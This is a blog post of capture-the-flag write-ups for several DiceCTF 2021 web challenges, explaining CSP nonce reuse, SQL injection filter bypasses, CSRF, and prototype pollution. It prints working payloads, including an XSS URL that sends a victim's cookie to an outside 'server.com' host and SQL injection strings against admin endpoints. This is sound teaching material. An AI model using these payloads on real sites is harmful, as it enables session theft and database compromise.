---
title: "DiceCTF 2021"
date: 2021-02-07T19:06:12-07:00
draft: false
toc: true
images:
categories:
  - writeups
tags:
  - writeups
  - xss
  - sqli
  - web
  - prototype-pollution
  - csrf
---

## Babier CSP

The challenge takes after justCTF's [similarly named challenge](/posts/2021/01/justctf-2020-a-collection-of-web-problems/#baby-csp). We're given an `index.js` file:

```js
const express = require('express');
const crypto = require("crypto");
const config = require("./config.js");
const app = express()
const port = process.env.port || 3000;

const SECRET = config.secret;
const NONCE = crypto.randomBytes(16).toString('base64');

const template = name => `
<html>

${name === '' ? '': `<h1>${name}</h1>`}
<a href='#' id=elem>View Fruit</a>

<script nonce=${NONCE}>
elem.onclick = () => {
  location = "/?name=" + encodeURIComponent(["apple", "orange", "pineapple", "pear"][Math.floor(4 * Math.random())]);
}
</script>

</html>
`;

app.get('/', (req, res) => {
  res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
  res.send(template(req.query.name || ""));
})

app.use('/' + SECRET, express.static(__dirname + "/secret"));

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
```

The main difference between Dice's challenge and justCatTheFish's is the hashing of the `NONCE` value. When this script is executed, it sets the `NONCE` value once, and it doesn't change values once this server is running.

In justCatTheFish's challenge, the `NONCE` value is hashed every time a request is made, sufficiently randomizing the value. However, for this challenge, we can easily get the `NONCE` value from the content security policy and incorporate it into our input so it will be accepted.

We can do a reflected XSS attack by specifying a `?name=` query parameter, so we would inject a script tag in the URL. We need to specify the right `NONCE` value, which we can see by accessing the page: 

{{< image src="/images/DiceCTF2021_BabierCSPNonce.png" alt="sa256" position="center" style="border-radius: 8px;" >}}

And so we format our payload as:

``` URL
https://babier-csp.dicec.tf/?name=<script+nonce=LRGWAXOY98Es0zz0QOVmag==>document.location='server.com?cookie='%2Bbtoa(document.cookie)</script>
```
We grab the secret in the cookie and use that value to access the flag.

```
https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/
```
{{< image src="/images/DiceCTF2021_BabierCSPFlag.png" alt="sa256" position="center" style="border-radius: 8px;" >}}

## Missing Flavortext

We are given a single login page, and an `index.js` file (Some parts omitted to show what is relevant):

```js
const express = require('express');
const bodyParser = require('body-parser');

const app = express();

// parse json and serve static files
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('static'));

// login route
app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password) {
    return res.redirect('/');
  }

  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }

  // see if user is in database
  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;

  let id;
  try { id = db.prepare(query).get()?.id } catch {
    return res.redirect('/');
  }

  // correct login
  if (id) return res.sendFile('flag.html', { root: __dirname });

  // incorrect login
  return res.redirect('/');
});
```

Earlier we saw that we needed to log in as the user `admin`, and there's an sqlite database holding the user credentials. We're not given much feedback - if we give a set of invalid credentials, or an issue with the database occurs, or the `username` and `password` parameters aren't set, OR either of those parameters contain a `'` single quote, we are redirected back to the index.
This means that if we try to inject single quotes ourselves to try a classic sqli payload such as ` ' OR 1=1` in the `password` parameter, the app would reject it.

However, what's important to note is the application's use of its `bodyParser`, which is operating on extended mode. If you've seen my [GoogleCTF Pasteurize writeup](/posts/2020/08/googlectf-2020-pasteurize), then you'd probably know about the flexibility of extended mode and what that means for us here. To summarize, npm's `bodyParser` will use the `qs` library to parse request bodies when in extended mode. The `qs` library can parse a variety of different objects - not just strings - if they're formatted a certain way in the request. By default, the contents of the request body will be parsed as strings and treated as such - but if you give a request parameter and specify it to be parsed as an array (using `[]` notation), it will instead be parsed as an array.

When the program parses through our input, looking for a single quote character, it will parse it differently according to its type. If our input is a string, the functionality of the program will iterate through each character in the string in search of a single quote. But if our input is an array, it will iterate through each element in the array, looking for an element that will exactly match a single quote. We can therefore bypass the single quote check by specifying our `password` parameter as an array. So, we just need to modify the request body accordingly.

```
username=admin&password[]=test' OR 1=1--
```

Without the `[]` notation, the `'` char in our input would fail the check.

## Web Utils

The application appears to be a pastebin and also a URL shortener. We're provided the source as well, and what's interesting is to note how the application parses our input, which is treated as JSON.

If we create a paste, there's a front-end script which runs a request to `/api/createPaste`, which stores our paste into a database.

```js
(async () => {

  await new Promise((resolve) => {
    window.addEventListener('load', resolve);
  });

  document.getElementById('text-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const text = document.getElementById('text-input').value;
    const res = await (await fetch('/api/createPaste', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        data: text
      })
    })).json();

    if (res.error) {
      return;
    }

    document.getElementById('output').textContent =
      `${window.origin}/view/${res.data}`
  });

})();
```

Similarly if we make a shortened link, there's a front-end script that will do the same thing, but instead to `/api/createLink`.

This seems like a cut and clear xss, with a caveat: when we make a paste, our input is treated as a string and so we won't be able to inject anything in a string context. Luckily, we can make a link, which in the `view.html` module will set the `window.location` to whatever we specify. Here, we can potentially escape out of the string context and execute javascript. However, unluckily, if we try to make a link, the `/api/createLink` endpoint has an additional check not present in the paste endpoint:

```js
...

  fastify.post('createLink', {
    handler: (req, rep) => {
      const uid = database.generateUid(8);
      const regex = new RegExp('^https?://');
      if (! regex.test(req.body.data))
        return rep
          .code(200)
          .header('Content-Type', 'application/json; charset=utf-8')
          .send({
            statusCode: 200,
            error: 'Invalid URL'
          });

...
```
If our data doesn't start with `https?://` then we recieve an error. So, ideally, we would want the freedom of `/api/createPaste` combined with the freedom of how `view.html` renders links. 

We can combine the two by sending a POST request to `/api/createPaste`, but malform our request body to override the `type` parameter, which dictates whether our input is a paste or a link. Luckily, the request processing is done client-side, so we can freely add additional items into the JSON data. 

You can use Burpsuite or a browser that allows request editing to do this.

```JSON
{"data":"javascript:alert(1);", "type": "link"}
```

With this as our request body, we can retrieve the created "paste/link" id and visit the webpage to see that our code is correctly interpreted as javascript. We can report our "paste/link" to the admin bot and grab their cookie, which has the flag. 

## Build a Better Panel

A derivative of another challenge called "Build a Panel", but harder. The website is a "widget" panel, which appear to work using "embedly" cards. There's already an example of a panel from reddit. The challenge also gave us an admin bot to report URLs to, so this may be another xss challenge.

...With a few caveats. First, the admin bot only visits sites matching the following regex: `^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$`

Second, the CSP in the application is pretty strict:

``` bash
default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;
```

And so there are a few issues that would need to be addressed before "Build a Better Panel" can be solved. With that being said, I'm pretty sure it's better to take a look at the first challenge, "Build a Panel", first.

### Build a Panel

The first challenge is roughly the same code but the admin bot doesn't have the same regex check. So, the solution for both challenges may involve much of the same steps. 

We can examine source and find this interesting function (also present in "build a better panel"):

```js
app.get('/admin/debug/add_widget', async (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(cookies['token'] && cookies['token'] == secret_token){
        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
        db.run(query, (err) => {
            if(err){
                console.log(err);
                res.send('something went wrong');
            }else{
                res.send('success!');
            }
        });
    }else{
        res.redirect('/');
    }
});
```
The endpoint is a special admin api call that inserts a widget into the widget table. In order to prevent non-admins from accessing the functionality of this call, a token value extracted from the visitor's cookies are compared to some `secret_token` value, which presumably only the admin has. But we can still get unintentional access by tricking an admin into visiting this endpoint without them knowing - executing a CSRF attack. 

Specifically, a CSRF attack to execute an SQL injection. Since the endpoint constructs a query to add a widget into the database, we need to format our CSRF attack to include an SQLi payload. So, what are we trying to do with the database to perform SQLi on?

In the source exists another table, called "flag":

```js
query = `CREATE TABLE IF NOT EXISTS flag (
    flag TEXT
)`;
db.run(query, [], (err) => {
    if(!err){
        let innerQuery = `INSERT INTO flag SELECT 'dice{fake_flag}'`;
        db.run(innerQuery);
    }else{
        console.error('Could not create flag table');
    }
});
```

So this is our SQLi target: we want to run rogue SQL commands through the `/admin/debug/add_widget` endpoint, to access the "flag" table. We have an input, now we just need an output.

Since the query parameters in the `/admin/debug/add_widget` endpoint are unsanitized, we inject SQL into there - specifically through the `panelId` query:

```sql
', (SELECT * FROM flag), '{"type":"whatever"}');--
```

So the final URL to report to admin is this:

```
https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=112ad5ea-5583-4818-be4b-d1eb03ac3002', (SELECT * FROM flag), '{"type":"whatever"}');--&widgetname=0&widgetdata=0
```

And we just need to reload our panel and get the flag.

{{< image src="/images/DiceCTF2021_BAPFlag.png" alt="sa256" position="center" style="border-radius: 8px;" >}}

### Prototype Pollution sans `__proto__`
Let's return to "Build A Better Panel".

Reading through the source, something immediately catches my eye, in the `custom.js` file:

```js
const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const safeDeepMerge = (target, source) => {
    for (const key in source) {
        if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                safeDeepMerge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}
```

This is a function that merges 2 js objects together. Typically, JSON merges like this function are prime targets for a vulnerability known as **prototype pollution**, an exploit unique to javascript that leverages the functionality of the prototype-based language. To summarize, one can modify the prototype properties of an object and pollute every object inheriting from that same prototype in javascript with the keyword `__proto__`.

Unfortunately, this is a slightly safer merge since the function explicitly looks out for the `__proto__` keyword. The `__proto__` keyword is an object property that accesses the `Object.prototype` of a js object literal. `safeDeepMerge` will be iterating through the keys of a given JSON parameter looking for it, so we need to access `Object.prototype` in a different way. Unfortunately, we can't just straight up input `Object.prototype` because of the value `mergableTypes` - among that list, `Object` is not one of them, so `safeDeepMerge` will bypass `Object` too. However, `Object` itself can be accessed without explicitly declaring it. You can specify an instance of the basic javascript object with the constructor method. Therefore, `constructor.prototype` = `Object.prototype` = `__proto__`. We can use `constructor.prototype` to bypass `safeDeepMerge`!

How can we use this to our advantage? In the widget panel, there's an example widget of a reddit page using embedly. Doing some [googling](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md) leads us to discover that prototype pollution through the embedly script is possible! 

I'll skip the parts where I banged my head against the wall for a long time trying to use prototype pollution to craft an XSS payload on the page. The problem with that was the strict CSP, which was the same one as "Build A Panel":

```bash
default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;
```

In short, I can't execute anything since the script-src is either `self` or from `embedly.com`. So what now?

Let's take a look at the regex that the admin bot has again: `^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$`

The endpoint in question is outlined below:

```js
 app.get('/create', (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(!cookies['panelId']){
        const newPanelId = queryParams['debugid'] || uuidv4();
    
        res.cookie('panelId', newPanelId, {maxage: 10800, httponly: true, sameSite: 'strict'});
    }

    res.redirect('/panel/');
});

app.get('/panel/', (req, res) => {
    const cookies = req.cookies;

    if(cookies['panelId']){
        res.render('pages/panel');
    }else{
        res.redirect('/');
    }
});
```

`/create` accepts one query, `debugId`, which renders a `pages/panel` when provided. In there, the `custom.js` file is loaded, which features the `safeDeepMerge` function. So, if we can create some specific widget that uses prototype pollution to execute rogue code, then we can just send that widget's `debugId` to the admin and get the flag! 

### Combining it all

So, we can have an admin take a look at a specific panel using `/create?debugId=x` and we can craft that panel to execute rogue code based on abusing the functionality of `safeDeepMerge` to execute prototype pollution. We just need to combine the payload from "Build a Panel" with a payload that constructs a widget executing the pollution, and grab that widget's `debugId` so the admin will visit it. 

So, we simply need to add a new panel with our payload:

```JSON
{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"<script src='/admin/debug/add_widget?panelid=vie99vie&widgetname=whatev&widgetdata='),('vie99vie', (select flag from flag), '{"type":"whatev"}') --
```

Once we file this request, we just have to report to the admin the url `https://build-a-better-panel.dicec.tf/create/?debugId=vie99vie` and check back to our panel to retrieve the flag. 

This was quite the challenge, which involved a lot of working parts and required me to test the depth of my knowledge on classic, established web exploits. I learned alot, and while I may have taken a while in wrapping my head around it, I'm glad I was able to understand it eventually.

**Vie**

